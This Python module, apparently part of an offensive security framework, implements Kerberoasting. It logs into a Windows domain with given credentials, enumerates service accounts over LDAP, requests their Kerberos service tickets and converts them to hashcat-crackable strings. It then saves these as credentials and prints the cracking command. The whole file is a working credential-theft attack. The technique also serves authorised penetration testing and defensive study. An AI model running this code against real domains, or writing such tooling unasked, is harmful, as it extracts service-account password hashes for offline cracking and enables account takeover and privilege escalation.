# scripts/kerberos/extraction/kerberoasting.py
"""
Kerberoasting — request TGS for accounts with SPN and output
hashcat -m 13100 format ($krb5tgs$23$...).

Uses impacket's getKerberosTGT + getKerberosTGS pipeline,
identical to impacket/examples/GetUserSPNs.py.
"""

from core.output import console
from core import session_db
from scripts.base import BaseScript

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.krb5.asn1 import TGS_REP
    from impacket.ldap import ldap, ldapasn1
    from pyasn1.codec.ber import decoder
    _IMPACKET_OK = True
except ImportError:
    _IMPACKET_OK = False


def _format_hash(spn, username, realm, tgs_rep_blob):
    """
    Build the hashcat -m 13100 string from the raw TGS-REP DER bytes.
    Mirrors GetUserSPNs.py output exactly.
    """
    decoded     = decoder.decode(tgs_rep_blob, asn1Spec=TGS_REP())[0]
    ticket_enc  = decoded["ticket"]["enc-part"]
    etype       = int(ticket_enc["etype"])
    cipher      = bytes(ticket_enc["cipher"])

    # RC4-HMAC (23): first 16 bytes = checksum, rest = data
    # AES (17/18): same split convention for hashcat
    checksum = cipher[:16].hex()
    data     = cipher[16:].hex()

    if etype in (23, -133):
        tag = "$krb5tgs$23$"
    elif etype == 17:
        tag = "$krb5tgs$17$"
    elif etype == 18:
        tag = "$krb5tgs$18$"
    else:
        tag = f"$krb5tgs${etype}$"

    return f"{tag}*{username}${realm}${spn}*${checksum}${data}"


class Script(BaseScript):
    name        = "kerberoasting"
    protocol    = "kerberos"
    category    = "extraction"
    description = (
        "Request TGS for SPN accounts and output hashcat -m 13100 hashes. "
        "Requires valid credentials."
    )

    def run(self, **kwargs):
        if not _IMPACKET_OK:
            console.print("[red]impacket not installed.[/red]")
            return None

        ip       = self.target.ip
        domain   = self.creds.domain   or ""
        user     = self.creds.user     or ""
        passwd   = self.creds.password or ""
        nt_hash  = self.creds.hash     or ""
        spn_arg  = kwargs.get("spn", "")

        if not domain or not user:
            console.print("[red]Requires: -d <domain> -u <user> and -p or -H[/red]")
            return None

        lm_hash = ""
        if nt_hash and ":" in nt_hash:
            lm_hash, nt_hash = nt_hash.split(":", 1)

        # ── 1. Get TGT ────────────────────────────────────────────────────────
        console.print(f"[dim][kerberoasting] Getting TGT for {user}@{domain}...[/dim]")
        try:
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                clientName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
                password   = passwd,
                domain     = domain,
                lmhash     = bytes.fromhex(lm_hash)  if lm_hash  else b"",
                nthash     = bytes.fromhex(nt_hash)   if nt_hash  else b"",
                aesKey     = b"",
                kdcHost    = ip,
            )
        except Exception as e:
            console.print(f"[red]TGT failed: {e}[/red]")
            return None

        # ── 2. Find SPNs (LDAP) or use the one provided ───────────────────────
        spn_accounts = []

        if spn_arg:
            spn_accounts = [(user, spn_arg)]
        else:
            console.print("[dim][kerberoasting] Enumerating SPN accounts via LDAP...[/dim]")
            try:
                ldap_conn = ldap.LDAPConnection(f"ldap://{ip}", domain, ip)
                ldap_conn.login(user, passwd, domain, lm_hash, nt_hash)

                filt = (
                    "(&(servicePrincipalName=*)"
                    "(UserAccountControl:1.2.840.113556.1.4.803:=512)"
                    "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))"
                    "(!(objectCategory=computer)))"
                )
                resp = ldap_conn.search(
                    searchFilter = filt,
                    attributes   = ["sAMAccountName", "servicePrincipalName"],
                    sizeLimit    = 0,
                )
                for item in resp:
                    if not isinstance(item, ldapasn1.SearchResultEntry):
                        continue
                    sam, spns = "", []
                    for attr in item["attributes"]:
                        aname = str(attr["type"])
                        avals = [str(v) for v in attr["vals"]]
                        if aname == "sAMAccountName":
                            sam = avals[0]
                        elif aname == "servicePrincipalName":
                            spns = avals
                    if sam and spns:
                        spn_accounts.append((sam, spns[0]))
            except Exception as e:
                console.print(f"[yellow]LDAP enum failed: {e}[/yellow]")

        if not spn_accounts:
            console.print("[yellow]No SPN accounts found.[/yellow]")
            return None

        console.print(f"[dim][kerberoasting] {len(spn_accounts)} SPN account(s) found. Requesting TGS...[/dim]\n")

        # ── 3. Request TGS and format hash ────────────────────────────────────
        hashes = []
        for sam, spn in spn_accounts:
            try:
                server_name = Principal(
                    spn,
                    type=constants.PrincipalNameType.NT_SRV_INST.value
                )
                tgs, tgs_cipher, _, tgs_session_key = getKerberosTGS(
                    serverName = server_name,
                    domain     = domain,
                    kdcHost    = ip,
                    tgt        = tgt,
                    cipher     = cipher,
                    sessionKey = session_key,
                )
                hash_str = _format_hash(spn, sam, domain, tgs)
                hashes.append((sam, spn, hash_str))

                console.print(f"  [green]✓[/green] [bold]{sam}[/bold]  ({spn})")
                console.print(f"    [cyan]{hash_str}[/cyan]\n")

                session_db.DB.SaveFinding(ip, "KERBEROS", "kerberoastable", f"user={sam} spn={spn}")
                session_db.DB.SaveCredential(ip, sam, hash_str, "krb5tgs", False, "kerberoasting")

            except Exception as e:
                console.print(f"  [red]✗[/red] {sam} ({spn}): {e}")

        if hashes:
            console.print(f"[bold green]{len(hashes)} hash(es) obtained.[/bold green]")
            console.print("[dim]Crack with: hashcat -m 13100 hashes.txt wordlist.txt[/dim]")

        return [h[2] for h in hashes] or None
